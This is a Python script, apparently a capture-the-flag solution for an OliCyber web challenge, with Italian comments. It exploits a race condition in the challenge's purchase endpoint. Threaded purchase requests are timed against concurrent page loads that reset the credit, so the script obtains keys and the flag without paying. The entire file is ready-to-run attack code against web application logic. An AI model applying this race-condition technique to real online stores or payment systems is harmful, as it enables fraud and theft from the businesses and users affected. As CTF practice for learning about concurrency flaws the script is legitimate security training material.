import threading
import requests
from bs4 import BeautifulSoup
from time import sleep

URL = 'http://67f46060c472da5b.dependency-hell.challs.olicyber.it/'

def req1(): # Mando la richiesta per prendere la key nel mentre le altre richieste resettano il credito
    waiting.wait()
    global red_key
    global green_key
   
    r = s.post(URL+'buy',json={'item':'red_key'})
    red_key = r.json().get('item')
    waiting2.set()

def req3(): # Stessa cosa della req1 ma per la green key
    waiting2.wait()
    # sleep(0.0245)
    global green_key
    r = s.post(URL+'buy',json={'item':'green_key','key': red_key})
    green_key = r.json().get('item')


def req2():
    waiting.wait()  
    s.get(URL)
def req4():
    waiting2.wait()
    s.get(URL)
   

while True:
    s = requests.Session()
    s.get(URL)
    red_key = None
    green_key = None
    waiting = threading.Event() # Elementi usati per far partire tutti assieme
    waiting2 = threading.Event()
    r1 = threading.Thread(target=req1)
    r2 = threading.Thread(target=req3)
    reset = [threading.Thread(target=req2) for _ in range(5)] 
    reset2 = [threading.Thread(target=req4) for _ in range(5)]
    r1.start()
    r2.start()
    for r in reset:
        r.start()
    for r in reset2:
        r.start()
    waiting.set()
    r1.join()
    for r in reset:
        r.join()

    r2.join()
    for r in reset2:
        r.join()
  

    r = s.get(URL)
    soup = BeautifulSoup(r.text, 'html.parser')
    balance = soup.find('strong').text
    print(red_key)
    print(green_key)
    print(balance)
    if '20' in balance and green_key != None:
        print('Success!')
        r = s.post(URL+'buy',json={'item':'blue_key','key': green_key})
        if 'Invalid' in r.text:
            print('Failed to get blue key')
            continue
        blue_key = r.json().get('item')
        
        r = s.post(URL+'buy',json={'item':'flag','key': blue_key})
        print(r.text)

        break
    waiting.clear()   
    waiting2.clear()